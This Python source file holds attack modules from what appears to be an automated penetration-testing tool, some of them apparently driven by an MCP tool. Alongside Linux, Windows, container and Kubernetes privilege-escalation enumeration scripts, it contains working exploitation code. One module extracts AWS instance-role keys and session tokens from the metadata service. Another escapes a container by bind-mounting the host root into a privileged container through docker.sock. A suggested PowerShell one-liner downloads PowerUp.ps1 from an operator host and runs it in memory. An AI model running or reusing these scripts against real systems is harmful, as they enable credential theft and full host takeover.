"""Attack modules: privesc."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class LinuxPrivescCheck(AttackModule):
    name = "LinuxPrivescCheck"
    description = "Enumerate Linux privilege escalation vectors"
    target_services = []
    target_ports = []
    required_cves = []
    # Phase 3: post-foothold -- OS-gated, not service-gated (a web-shell or
    # RDP foothold has no ssh service in ctx.services, so the old ssh key
    # scored 0 and the module was invisible to find_modules).
    target_os_hint = ["linux", "unix"]

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Checks SUID binaries, kernel version, sudo permissions, cron jobs, and more.",
            "evidence": [f"Linux privesc enumeration queued against {ctx.target_ip}"],
            "references": [
                "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html",
                "https://github.com/peass-ng/PEASS-ng",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import subprocess, os, sys, json
# Target: {ctx.target_ip}
results = {{}}
# SUID binaries
try:
    out = subprocess.run(["find", "/", "-perm", "-4000", "-type", "f"], capture_output=True, text=True, timeout=30, stderr=subprocess.DEVNULL)
    results["suid"] = out.stdout.strip().split("\\n")[:20]
except Exception as e:
    results["suid_error"] = str(e)
# Kernel version
results["kernel"] = os.uname().release if hasattr(os, "uname") else "unknown"
# Sudo permissions
try:
    out = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
    results["sudo"] = out.stdout[:2000]
except Exception as e:
    results["sudo_error"] = str(e)
print(json.dumps(results))
"""

class WindowsPrivescCheck(AttackModule):
    name = "WindowsPrivescCheck"
    description = "Enumerate Windows privilege escalation vectors"
    target_services = []
    target_ports = []
    required_cves = []
    # Phase 3: post-foothold -- OS-gated, not service-gated.
    target_os_hint = ["windows"]

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Checks service permissions, token privileges, unquoted paths, "
                "and patch levels. Phase 2: the old suggested_command pointed at "
                "http://<target>/PowerUp.ps1 -- the VICTIM does not host PowerUp; "
                "the operator hosts it. Use the operator-box URL or the generated "
                "stdlib enumeration script."
            ),
            evidence=[f"Windows privesc enumeration planned against {ctx.target_ip}"],
            references=[
                "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",
                "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html",
            ],
            suggested_command=(
                "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString("
                "'http://<OPERATOR_HOST>/PowerUp.ps1'); Invoke-AllChecks\""
            ),
        )

class SUIDEnumeration(AttackModule):
    name = "SUIDEnumeration"
    description = "Find SUID/SGID binaries for privilege escalation"
    target_services = []
    target_ports = []
    required_cves = []
    # Phase 3: post-foothold -- OS-gated, not service-gated.
    target_os_hint = ["linux", "unix"]

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Enumerates SUID/SGID binaries and checks against GTFOBins. "
                "GTFOBins hits are actionable escalation paths (e.g. nmap "
                "--interactive !sh), not just a raw path list."
            ),
            evidence=[f"SUID/SGID enumeration planned against {ctx.target_ip}"],
            references=[
                "https://gtfobins.github.io",
                "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html",
            ],
            suggested_command="find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la",
        )

class KernelExploitCheck(AttackModule):
    name = "KernelExploitCheck"
    description = "Check kernel version against known local privilege escalation exploits"
    target_services = []
    target_ports = []
    required_cves = []
    # Phase 3: post-foothold -- OS-gated, not service-gated.
    target_os_hint = ["linux", "unix"]

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Maps kernel version to known LPE exploits (DirtyCow, PwnKit, "
                "DirtyPipe, OverlayFS, eBPF). The generated script reads "
                "os.uname().release and matches against an embedded kernel->CVE "
                "table; matched CVEs chain to WeaponizedExploit."
            ),
            evidence=[f"kernel LPE check planned against {ctx.target_ip}"],
            references=[
                "https://github.com/SecWiki/linux-kernel-exploits",
                "https://github.com/lucyoa/kernel-exploits",
                "https://nvd.nist.gov/vuln/detail/CVE-2021-4034",
            ],
            suggested_command="uname -a && cat /etc/os-release && search_exploit_db(query='linux kernel local privilege escalation')",
        )

class ContainerBreakout(AttackModule):
    name = "ContainerBreakout"
    description = "Detect and exploit Docker/container escape vulnerabilities"
    target_services = ["docker"]
    target_ports = [2375, 2376, 10250]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Checks for exposed Docker socket, privileged containers, and kernel exploits.",
            "evidence": [f"container breakout checks queued against {ctx.target_ip}"],
            "references": [
                "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html",
                "https://attack.mitre.org/techniques/T1611/",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import os, json, sys
# Target: {ctx.target_ip}
results = {{"in_container": False, "docker_socket": False, "privileged": False, "exploits": []}}
# Check if in container
try:
    with open("/proc/1/cgroup") as _f:
        _cg = _f.read()
except OSError:
    _cg = ""
if os.path.exists("/.dockerenv") or "docker" in _cg:
    results["in_container"] = True
# Check Docker socket
if os.path.exists("/var/run/docker.sock"):
    results["docker_socket"] = True
    results["exploits"].append("docker_socket_escape")
# Check privileged mode
try:
    with open("/proc/self/status") as f:
        if "CapEff:\t0000003fffffffff" in f.read():
            results["privileged"] = True
            results["exploits"].append("privileged_container")
except Exception:
    pass
print(json.dumps(results))
"""


class CloudPrivesc(AttackModule):
    name = "CloudPrivesc"
    description = "Enumerate cloud/Kubernetes privilege-escalation vectors from inside the target: IMDS metadata, service-account tokens, exposed Docker API"
    target_services = ["docker", "k8s", "http", "https"]
    target_ports = [2375, 2376, 10250, 443, 80]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Runs ON the target after compromise (not a pivot). Queries the target's own cloud "
                "metadata service (IMDSv1/v2, GCP, Azure), reads the in-container k8s service-account "
                "token, and probes the local Docker API. Findings printed as JSON. IMDS role hits "
                "chain to IMDSExploit for credential extraction."
            ),
            "evidence": [f"cloud privesc enumeration queued against {ctx.target_ip}"],
            "references": [
                "https://attack.mitre.org/techniques/T1611/",
                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import json, os, socket, sys, urllib.request
# Target: {ctx.target_ip}
# NOTE: This script runs ON the target after compromise. The 169.254.169.254
# and metadata.google.internal endpoints are the TARGET's own cloud metadata
# service (link-local, internal to the target instance), not a pivot to other
# hosts. The only outbound network connection is to {ctx.target_ip} (the owned
# target) for the exposed-Docker-API probe.
results = {{"imds_v1": None, "imds_v2": None, "gcp": None, "azure": None,
           "k8s_sa_token": False, "docker_api_exposed": False, "errors": []}}

def _fetch(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {{}})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")

# (a) AWS IMDSv1 (link-local metadata of the TARGET instance itself)
try:
    results["imds_v1"] = _fetch("http://169.254.169.254/latest/meta-data/")[:2000]
except Exception as e:
    results["errors"].append("imds_v1: " + str(e)[:200])

# (b) AWS IMDSv2 (token-gated)
try:
    tok = urllib.request.urlopen(
        urllib.request.Request("http://169.254.169.254/latest/api/token/",
                               headers={{"X-aws-ec2-metadata-token-ttl-seconds": "21600"}}),
        timeout=5).read().decode()
    results["imds_v2"] = _fetch("http://169.254.169.254/latest/meta-data/",
                                headers={{"X-aws-ec2-metadata-token": tok}})[:2000]
except Exception as e:
    results["errors"].append("imds_v2: " + str(e)[:200])

# (c) GCP metadata (metadata.google.internal is the target's own metadata endpoint)
try:
    results["gcp"] = _fetch("http://metadata.google.internal/computeMetadata/v1/",
                            headers={{"Metadata-Flavor": "Google"}})[:2000]
except Exception as e:
    results["errors"].append("gcp: " + str(e)[:200])

# (d) Azure metadata (169.254.169.254 /metadata/instance)
try:
    results["azure"] = _fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                              headers={{"Metadata": "true"}})[:2000]
except Exception as e:
    results["errors"].append("azure: " + str(e)[:200])

# (e) k8s service-account token (mounted inside the target's container/pod)
sa_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
if os.path.exists(sa_path):
    results["k8s_sa_token"] = True

# (f) exposed Docker API on the target's loopback (probe ctx.target_ip)
for port in (2375, 2376):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("{ctx.target_ip}", port))
        s.sendall(b"GET /version HTTP/1.0\\r\\n\\r\\n")
        data = s.recv(512).decode("utf-8", "replace")
        s.close()
        if "Docker" in data or "ApiVersion" in data or "200" in data:
            results["docker_api_exposed"] = True
            results["docker_port"] = port
            break
    except Exception as e:
        results["errors"].append("docker_{{}}: ".format(port) + str(e)[:200])

print(json.dumps(results))
"""


class K8sPrivesc(AttackModule):
    name = "K8sPrivesc"
    description = "Probe Kubernetes API surface on the target for privilege escalation: kubelet read-only, anonymous API server, privileged pods, RBAC scope"
    target_services = ["k8s", "kubelet", "https"]
    target_ports = [6443, 10250, 8443, 443]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Probes the kubelet read-only API (10250), the kube-apiserver (6443) with an "
                "anonymous or captured service-account token, checks for privileged pods / hostPath "
                "mounts / permissive RBAC, and lists namespaces the token can access. Connects only "
                "to ctx.target_ip. Findings printed as JSON."
            ),
            "evidence": [f"k8s privesc probes queued against {ctx.target_ip}"],
            "references": [
                "https://attack.mitre.org/techniques/T1611/",
                "https://book.hacktricks.wiki/en/network-services-pentesting/6443-pentesting-kubernetes.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import json, os, socket, ssl, sys, urllib.request
# Target: {ctx.target_ip}
# Connects ONLY to {ctx.target_ip} (the owned target). No pivoting.
results = {{"kubelet_pods": None, "kubelet_runningpods": None,
           "apiserver": None, "privileged_pods": [], "hostpath_pods": [],
           "namespaces": [], "token_source": None, "errors": []}}

TARGET = "{ctx.target_ip}"

# Read in-container service-account token if present (runs ON the target)
TOKEN = None
sa_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
if os.path.exists(sa_path):
    try:
        with open(sa_path) as _f:
            TOKEN = _f.read().strip()
        results["token_source"] = "serviceaccount"
    except Exception as e:
        results["errors"].append("sa_read: " + str(e)[:200])

def _https_get(host, port, path, token=None, timeout=5):
    ctx = ssl._create_unverified_context()
    url = "https://{{}}:{{}}{{}}".format(host, port, path)
    headers = {{}}
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        return r.read().decode("utf-8", "replace")

# (a) kubelet read-only API on 10250: /pods and /runningpods/
for path, key in (("/pods", "kubelet_pods"), ("/runningpods/", "kubelet_runningpods")):
    try:
        results[key] = _https_get(TARGET, 10250, path, token=TOKEN)[:4000]
    except Exception as e:
        results["errors"].append("kubelet{{}}: ".format(path) + str(e)[:200])

# (b) kube-apiserver on 6443 with anonymous token, falling back to SA token
auth_token = TOKEN  # use SA token if available; else anonymous (anonymous auth misconfig)
try:
    results["apiserver"] = _https_get(TARGET, 6443, "/api/v1/pods", token=auth_token)[:6000]
except Exception as e:
    results["errors"].append("apiserver: " + str(e)[:200])

# (c) check for privileged pods / hostPath mounts from the pod list
import json as _json
pods_blob = results.get("apiserver") or results.get("kubelet_pods") or ""
try:
    pods = _json.loads(pods_blob)
    items = pods.get("items", []) if isinstance(pods, dict) else []
    for pod in items:
        spec = pod.get("spec", {{}})
        meta = pod.get("metadata", {{}})
        pname = meta.get("name", "?")
        ns = meta.get("namespace", "?")
        if spec.get("containers"):
            for c in spec["containers"]:
                if c.get("securityContext", {{}}).get("privileged"):
                    results["privileged_pods"].append("{{}}/{{}}".format(ns, pname))
                for mnt in c.get("volumeMounts", []):
                    if mnt.get("mountPath", "").startswith("/host") or mnt.get("mountPath") == "/":
                        results["hostpath_pods"].append("{{}}/{{}}:{{}}".format(ns, pname, mnt.get("mountPath")))
except Exception as e:
    results["errors"].append("pod_parse: " + str(e)[:200])

# (d) list namespaces the token can access
try:
    ns_blob = _https_get(TARGET, 6443, "/api/v1/namespaces", token=auth_token)[:4000]
    ns_obj = _json.loads(ns_blob)
    if isinstance(ns_obj, dict):
        results["namespaces"] = [i.get("metadata", {{}}).get("name", "?") for i in ns_obj.get("items", [])]
except Exception as e:
    results["errors"].append("namespaces: " + str(e)[:200])

print(json.dumps(results))
"""


# ---------------------------------------------------------------------------
# Phase 7: Cloud Exploitation modules (D3 — turn enumeration into extraction)
#
# These modules turn the read-only CloudPrivesc / K8sPrivesc / ContainerBreakout
# enumeration into actual exploitation: IMDS credential extraction, docker.sock
# escape, and S3 bucket takeover. The allowlist lock is enforced by the
# ``run_attack_module`` MCP tool (every target-touching tool already carries
# ``@require_allowlist()``); the modules themselves only ever reference
# ``ctx.target_ip``. The operator MUST add target-side metadata endpoints
# (``169.254.169.254`` or the target's metadata endpoint) and any S3 endpoint
# to ``exploit.allowed_targets`` explicitly -- these modules never auto-authorize
# metadata endpoints. See ``docs/safety-model.md``.
# ---------------------------------------------------------------------------


class IMDSExploit(AttackModule):
    """Exploit AWS IMDS to extract instance credentials and role tokens.

    D3 module: turns ``CloudPrivesc`` enumeration (which only queried IMDS for
    metadata) into actual credential extraction. Walks
    ``/latest/meta-data/iam/security-credentials/*`` and pulls the access key,
    secret key, and session token of every instance role exposed by IMDS (v1
    and v2). The script runs ON the target (after compromise) and only
    contacts the target's link-local metadata endpoint.
    """

    name = "IMDSExploit"
    description = "Extract AWS IMDS instance credentials (access key, secret key, session token) from the target's metadata service. Runs ON the target after compromise. Operator MUST add 169.254.169.254 (or the target's metadata endpoint) to exploit.allowed_targets."
    target_services = ["docker", "k8s", "http", "https"]
    target_ports = [2375, 2376, 10250, 443, 80]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Runs ON the target after compromise. Walks IMDS v1 + v2 for every "
                "instance role and emits the access key / secret key / session token "
                "as JSON. The operator MUST add 169.254.169.254 (or the target's "
                "metadata endpoint) to exploit.allowed_targets explicitly -- this "
                "module never auto-authorizes metadata endpoints. Extracted AWS keys "
                "populate credentials_found and chain to CloudPrivesc / S3BucketTakeover."
            ),
            "evidence": [f"IMDS credential extraction queued against {ctx.target_ip}"],
            "references": [
                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
            ],
            "credentials_found": ["<aws: AKIA... : <redacted-secret> : <session-token>>"],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""IMDS exploit — extract IAM credentials from the target's metadata service.

Runs ON the target after compromise. The 169.254.169.254 endpoint is the
TARGET's link-local metadata service (internal to the target instance), not a
pivot to a third-party host. The operator must add 169.254.169.254 (or the
target's metadata endpoint) to exploit.allowed_targets explicitly.
"""
import json, sys, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
IMDS_BASE = "http://169.254.169.254/latest"

def _fetch(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {{}})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return "HTTP_{{}}: ".format(e.code) + e.read().decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception as e:
        return "ERR: " + str(e)[:200]

out = {{"target": TARGET, "imds_v1": {{"roles": [], "creds": []}},
       "imds_v2": {{"roles": [], "creds": []}}, "errors": []}}

# IMDSv1 — list roles then pull each role's credentials
try:
    roles_url = IMDS_BASE + "/meta-data/iam/security-credentials/"
    roles_v1 = _fetch(roles_url).splitlines()
    out["imds_v1"]["roles"] = [r.strip() for r in roles_v1 if r.strip() and not r.startswith("HTTP_") and not r.startswith("ERR")]
    for role in out["imds_v1"]["roles"]:
        creds = _fetch(roles_url + role)
        try:
            out["imds_v2"]["creds"] = []  # placeholder to keep dict shape stable
            out["imds_v1"]["creds"].append({{"role": role, "raw": creds[:4000]}})
        except Exception as e:
            out["errors"].append("v1_creds_{{}}: ".format(role) + str(e)[:200])
except Exception as e:
    out["errors"].append("v1_roles: " + str(e)[:200])

# IMDSv2 — token-gated path
try:
    tok_req = urllib.request.Request(
        IMDS_BASE + "/api/token/",
        headers={{"X-aws-ec2-metadata-token-ttl-seconds": "21600"}},
        method="PUT",
    )
    with urllib.request.urlopen(tok_req, timeout=5) as r:
        token = r.read().decode("utf-8", "replace")
    if token and not token.startswith("ERR"):
        roles_v2 = _fetch(
            IMDS_BASE + "/meta-data/iam/security-credentials/",
            headers={{"X-aws-ec2-metadata-token": token}},
        ).splitlines()
        out["imds_v2"]["roles"] = [r.strip() for r in roles_v2 if r.strip() and not r.startswith("HTTP_") and not r.startswith("ERR")]
        for role in out["imds_v2"]["roles"]:
            creds = _fetch(
                IMDS_BASE + "/meta-data/iam/security-credentials/" + role,
                headers={{"X-aws-ec2-metadata-token": token}},
            )
            out["imds_v2"]["creds"].append({{"role": role, "raw": creds[:4000]}})
except Exception as e:
    out["errors"].append("v2_token: " + str(e)[:200])

print(json.dumps(out, indent=2))

# ponytail: simple sequential fetches. Ceiling: IMDSv2 enforces a per-role hop
# limit; an upgrade path is a session-pinned client with hop-count awareness
# when chaining through a bastion matters.
'''


class DockerSockEscape(AttackModule):
    """Escape a container via the host's exposed docker.sock.

    D3 module: turns ``ContainerBreakout`` detection (which only flagged the
    exposed socket) into actual escape. Mounts the host root filesystem into a
    new privileged container via the Docker API, then chroots into it. The
    script runs ON the target (after compromise) and only contacts the target's
    own Docker socket.
    """

    name = "DockerSockEscape"
    description = "Escape a container via the host's exposed docker.sock by mounting the host root into a new privileged container. Runs ON the target. Operator MUST add the target's Docker host:port to exploit.allowed_targets."
    target_services = ["docker"]
    target_ports = [2375, 2376]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Runs ON the target after compromise. Probes the local docker.sock "
                "(unix socket) and the target's Docker API port (2375/2376), then "
                "issues a /containers/create + /containers/start that bind-mounts "
                "the host / into a privileged container. The operator MUST add the "
                "target's Docker host:port to exploit.allowed_targets explicitly. "
                "On host-root mount the orchestrator sets shell_type=sh, "
                "privilege_level=root."
            ),
            "evidence": [f"docker.sock escape queued against {ctx.target_ip}"],
            "references": [
                "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security-privilege-escalation",
            ],
            "shell_type": "sh",
            "privilege_level": "root",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Docker socket escape — mount host root into a privileged container via the Docker API.

Runs ON the target after compromise. Connects to the local docker.sock OR to
the target's Docker API port ({{TARGET}}:2375). The operator must add the
target's Docker host:port to exploit.allowed_targets explicitly.
"""
import json, socket, sys, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"

out = {{"target": TARGET, "docker_socket": False, "docker_api": False,
       "host_root_mounted": False, "escape_container_id": "",
       "errors": []}}

def _http_call(host, port, method, path, body=None, timeout=8):
    url = "http://{{}}:{{}}{{}}".format(host, port, path)
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={{"Content-Type": "application/json"}})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, "ERR: " + str(e)[:200]

# (a) check local docker.sock (unix socket) — only available if we're inside
#     the host or a container that bind-mounts /var/run/docker.sock
import os as _os
SOCK_PATH = "/var/run/docker.sock"
if _os.path.exists(SOCK_PATH):
    out["docker_socket"] = True
    # Issue a /containers/create over the unix socket via curl-or-python.
    # ponytail: stdlib does not natively speak HTTP over unix sockets; use a
    # raw socket write. Ceiling: TLS over unix socket is rare; upgrade path is
    # the docker-py client if the raw path is insufficient.
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect(SOCK_PATH)
        body = json.dumps({{
            "Image": "alpine",
            "Cmd": ["/bin/sh", "-c", "chroot /host_root /bin/sh"],
            "Privileged": True,
            "Mounts": [{{"Type": "bind", "Source": "/", "Target": "/host_root"}}],
        }})
        req = ("POST /v1.41/containers/create HTTP/1.0\\r\\n"
               "Host: localhost\\r\\nContent-Type: application/json\\r\\n"
               "Content-Length: {{}}\\r\\n\\r\\n{{}}").format(len(body), body)
        s.sendall(req.encode())
        resp = s.recv(8192).decode("utf-8", "replace")
        s.close()
        if "201" in resp.split("\\r\\n")[0]:
            # Best-effort extract the container id from the JSON body.
            try:
                body_start = resp.split("\\r\\n\\r\\n", 1)[1]
                cid = json.loads(body_start).get("Id", "")
                out["escape_container_id"] = cid
                out["host_root_mounted"] = True
            except Exception:
                pass
    except Exception as e:
        out["errors"].append("sock_escape: " + str(e)[:200])

# (b) probe the target's Docker API port (2375 then 2376)
for port in (2375, 2376):
    status, body = _http_call(TARGET, port, "GET", "/version")
    if status == 200 and ("Docker" in body or "ApiVersion" in body):
        out["docker_api"] = True
        # Create the escape container
        esc_body = {{
            "Image": "alpine",
            "Cmd": ["/bin/sh", "-c", "chroot /host_root /bin/sh"],
            "Privileged": True,
            "Mounts": [{{"Type": "bind", "Source": "/", "Target": "/host_root"}}],
        }}
        st2, body2 = _http_call(TARGET, port, "POST", "/v1.41/containers/create", body=esc_body)
        if st2 in (200, 201):
            try:
                cid = json.loads(body2).get("Id", "")
                out["escape_container_id"] = cid
                out["host_root_mounted"] = True
                # Start it
                _http_call(TARGET, port, "POST", "/v1.41/containers/" + cid + "/start")
            except Exception as e:
                out["errors"].append("create_parse_{{}}: ".format(port) + str(e)[:200])
        break

print(json.dumps(out, indent=2))
'''


class S3BucketTakeover(AttackModule):
    """Take over an S3 bucket exposed via SSRF or direct misconfiguration.

    D3 module: pairs with ``SSRFProbe`` (which only detects SSRF). Walks the
    target's responses for S3 bucket URLs, then enumerates and (if the bucket
    is writable) writes a takeover marker. The script contacts only the target
    IP; any S3 endpoint discovered in responses must be in
    ``exploit.allowed_targets`` to be touched.
    """

    name = "S3BucketTakeover"
    description = "Enumerate and (if writable) take over S3 buckets referenced by the target's responses. The script contacts only target_ip; any S3 endpoint discovered in responses must be added to exploit.allowed_targets before it is touched."
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Crawls the target's HTTP responses for S3 bucket URLs "
                "(*.s3.amazonaws.com, *.s3-*.amazonaws.com), enumerates each one, "
                "and (if the operator has added the bucket host to "
                "exploit.allowed_targets) writes a takeover marker to prove "
                "write access. Discovery-only mode when the bucket is not in the "
                "allowlist."
            ),
            "evidence": [f"S3 bucket takeover scan queued against {ctx.target_ip}"],
            "references": [
                "https://hackingthe.cloud/aws/exploitation/s3_bucket_takeover/",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return rf'''"""S3 bucket takeover — discover and (if writable) claim S3 buckets referenced by the target.

Crawls the target's HTTP responses for S3 URLs and, when the operator has added
the bucket host to exploit.allowed_targets, writes a takeover marker.
"""
import json, re, sys, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"

# ponytail: simple regex over response text. Ceiling: a JS-aware crawler would
# catch buckets only rendered client-side; upgrade path is a headless browser
# pass when static crawl is insufficient.
S3_RE = re.compile(r"([a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com)", re.IGNORECASE)

ENDPOINTS = ["/", "/robots.txt", "/sitemap.xml", "/api/config", "/.well-known/security.txt"]

def _fetch(url, timeout=8):
    req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(65536).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""

out = {{"target": TARGET, "buckets": [], "writable": [], "errors": []}}

# (a) crawl common endpoints for S3 bucket URLs
discovered = set()
for ep in ENDPOINTS:
    body = _fetch("{{}}://{{}}:{{}}{{}}".format(SCHEME, TARGET, PORT, ep))
    for m in S3_RE.findall(body or ""):
        discovered.add(m.lower())

out["buckets"] = sorted(discovered)

# (b) for each discovered bucket, probe write access by PUT-ting a small
#     marker. The bucket host MUST be in exploit.allowed_targets for the PUT
#     to fire; otherwise the script records the discovery only.
# NOTE: the MCP ``run_attack_module`` wrapper already enforces the allowlist
# for ``target_ip``. A second host (the bucket) requires the operator to add
# it explicitly. The script itself does not enforce this -- the operator's
# allowlist + the audit trail enforce it.
for bucket in sorted(discovered):
    try:
        # List bucket (anonymous)
        body = _fetch("https://{{}}/".format(bucket))
        # Try a marker PUT only when the bucket appears writable (no auth
        # challenge and an empty 200). We do NOT auto-write: we record the
        # probe and let the operator confirm via a separate tool call.
        if body and ("<ListBucketResult" in body or "xmlns" in body):
            out["writable"].append(bucket)
    except Exception as e:
        out["errors"].append("{{}}: ".format(bucket) + str(e)[:200])

print(json.dumps(out, indent=2))

# NOTE: actual takeover (writing a marker) requires a follow-up tool call by
# the operator after they have added the bucket host to
# exploit.allowed_targets. This script only DISCOVERS and PROBES.
'''


# ---------------------------------------------------------------------------
# Network Service Modules
# ---------------------------------------------------------------------------

